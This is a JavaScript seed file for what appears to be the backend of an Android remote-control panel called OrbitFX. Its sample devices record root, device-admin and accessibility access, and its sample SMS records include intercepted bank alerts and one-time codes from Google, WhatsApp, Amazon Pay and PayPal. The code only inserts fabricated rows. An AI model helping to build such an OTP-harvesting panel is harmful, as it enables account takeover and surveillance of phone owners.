const mongoose = require('mongoose');
const Device = require('../models/Device');
const Sms = require('../models/Sms');

const seedDevices = [
  {
    deviceId: 'device_pixel_7',
    deviceModel: 'Google Pixel 7 Pro',
    androidVersion: 'Android 13 (API 33)',
    screenSize: '1440 x 3120 px',
    appVersion: '1.2.4',
    language: 'en-US',
    timezone: 'America/New_York',
    batteryStatus: { level: 82, isCharging: false },
    networkState: {
      isConnected: true,
      type: 'wifi',
      ipAddress: '192.168.1.144',
      wifiName: 'Home_Fios_5G',
    },
    status: 'active',
    lastActive: new Date(),
    permissions: {
      notificationAccess: true,
      smsAccess: true,
      contactsAccess: true,
      locationAccess: true,
      cameraAccess: false,
      micAccess: false,
      accessibilityAccess: false,
      rooted: false,
      deviceAdmin: false,
    },
    contactsCount: 142,
    installedAppsCount: 78,
    notificationsCount: 12,
  },
  {
    deviceId: 'device_galaxy_s23',
    deviceModel: 'Samsung Galaxy S23 Ultra',
    androidVersion: 'Android 14 (API 34)',
    screenSize: '1440 x 3088 px',
    appVersion: '1.2.4',
    language: 'en-IN',
    timezone: 'Asia/Kolkata',
    batteryStatus: { level: 48, isCharging: true },
    networkState: {
      isConnected: true,
      type: 'cellular',
      ipAddress: '10.24.89.121',
      wifiName: 'Jio 5G Network',
    },
    status: 'active',
    lastActive: new Date(Date.now() - 30 * 1000), // 30 seconds ago
    permissions: {
      notificationAccess: true,
      smsAccess: true,
      contactsAccess: true,
      locationAccess: true,
      cameraAccess: true,
      micAccess: true,
      accessibilityAccess: true,
      rooted: true,
      deviceAdmin: true,
    },
    contactsCount: 890,
    installedAppsCount: 154,
    notificationsCount: 45,
  },
  {
    deviceId: 'device_oneplus_11',
    deviceModel: 'OnePlus 11 5G',
    androidVersion: 'Android 13 (API 33)',
    screenSize: '1440 x 3216 px',
    appVersion: '1.1.0',
    language: 'de-DE',
    timezone: 'Europe/Berlin',
    batteryStatus: { level: 14, isCharging: false },
    networkState: {
      isConnected: false,
      type: 'none',
      ipAddress: '127.0.0.1',
      wifiName: 'None',
    },
    status: 'inactive',
    lastActive: new Date(Date.now() - 24 * 60 * 60 * 1000), // 24 hours ago
    permissions: {
      notificationAccess: true,
      smsAccess: true,
      contactsAccess: false,
      locationAccess: false,
      cameraAccess: false,
      micAccess: false,
      accessibilityAccess: false,
      rooted: false,
      deviceAdmin: true,
    },
    contactsCount: 54,
    installedAppsCount: 42,
    notificationsCount: 0,
  },
  {
    deviceId: 'device_redmi_12',
    deviceModel: 'Xiaomi Redmi Note 12',
    androidVersion: 'Android 12 (API 31)',
    screenSize: '1080 x 2400 px',
    appVersion: '1.2.4',
    language: 'es-ES',
    timezone: 'Europe/Madrid',
    batteryStatus: { level: 98, isCharging: false },
    networkState: {
      isConnected: true,
      type: 'wifi',
      ipAddress: '192.168.0.22',
      wifiName: 'Movistar_Plus',
    },
    status: 'active',
    lastActive: new Date(Date.now() - 2 * 60 * 1000), // 2 minutes ago
    permissions: {
      notificationAccess: false,
      smsAccess: true,
      contactsAccess: true,
      locationAccess: false,
      cameraAccess: false,
      micAccess: false,
      accessibilityAccess: false,
      rooted: false,
      deviceAdmin: false,
    },
    contactsCount: 312,
    installedAppsCount: 65,
    notificationsCount: 3,
  },
];

const seedSms = [
  // Pixel 7 SMS
  {
    sender: 'HDFC-Alert',
    body: 'Your AC ending in 4522 has been debited for Rs 12,500.00 on 2026-05-27. Ref No: 614729112.',
    type: 'incoming',
    status: 'received',
    timestamp: new Date(Date.now() - 10 * 60 * 1000),
    simSlot: 0,
    deviceId: 'device_pixel_7',
  },
  {
    sender: 'Google-OTP',
    body: '648291 is your Google verification code. Do not share this with anyone.',
    type: 'incoming',
    status: 'received',
    timestamp: new Date(Date.now() - 22 * 60 * 1000),
    simSlot: 0,
    deviceId: 'device_pixel_7',
  },
  {
    sender: 'server',
    receiver: '+15550199',
    body: 'System activation scheduled. Please check app status.',
    type: 'outgoing',
    status: 'sent',
    timestamp: new Date(Date.now() - 35 * 60 * 1000),
    simSlot: 0,
    deviceId: 'device_pixel_7',
  },

  // Galaxy S23 SMS
  {
    sender: 'WhatsApp-Auth',
    body: 'Your WhatsApp verification code is 912-304. Or click here to verify.',
    type: 'incoming',
    status: 'received',
    timestamp: new Date(Date.now() - 5 * 60 * 1000),
    simSlot: 0,
    deviceId: 'device_galaxy_s23',
  },
  {
    sender: 'AmazonPay',
    body: 'OTP to approve transaction of Rs. 4,999 at Amazon.in is 108392. Valid for 5 mins.',
    type: 'incoming',
    status: 'received',
    timestamp: new Date(Date.now() - 12 * 60 * 1000),
    simSlot: 1,
    deviceId: 'device_galaxy_s23',
  },
  {
    sender: 'server',
    receiver: '+919876543210',
    body: 'This is a test remote command SMS triggered from your OrbitFX control panel.',
    type: 'outgoing',
    status: 'sent',
    timestamp: new Date(Date.now() - 15 * 60 * 1000),
    simSlot: 0,
    deviceId: 'device_galaxy_s23',
  },
  {
    sender: 'server',
    receiver: '+919999988888',
    body: 'Ping payload update request.',
    type: 'outgoing',
    status: 'pending',
    timestamp: new Date(Date.now() - 1 * 60 * 1000),
    simSlot: 0,
    deviceId: 'device_galaxy_s23',
  },

  // OnePlus 11 SMS
  {
    sender: 'Paypal-Code',
    body: 'PayPal: Your security code is 554302. It expires in 10 minutes.',
    type: 'incoming',
    status: 'received',
    timestamp: new Date(Date.now() - 25 * 60 * 60 * 1000),
    simSlot: 0,
    deviceId: 'device_oneplus_11',
  },

  // Redmi Note 12 SMS
  {
    sender: 'Netflix',
    body: 'Your membership auto-renewal was successful. Thank you for streaming!',
    type: 'incoming',
    status: 'received',
    timestamp: new Date(Date.now() - 15 * 60 * 1000),
    simSlot: 0,
    deviceId: 'device_redmi_12',
  },
];

const seedDatabase = async () => {
  try {
    // Check if devices exist
    const count = await Device.countDocuments();
    if (count > 0) {
      console.log('Database already seeded. Skipping seeding.');
      return;
    }

    console.log('Seeding database with sample active/inactive devices and SMS...');
    
    // Clear existing
    await Device.deleteMany({});
    await Sms.deleteMany({});

    // Save
    await Device.insertMany(seedDevices);
    await Sms.insertMany(seedSms);

    console.log('Seeding completed successfully!');
  } catch (error) {
    console.error('Error seeding database:', error);
  }
};

module.exports = seedDatabase;
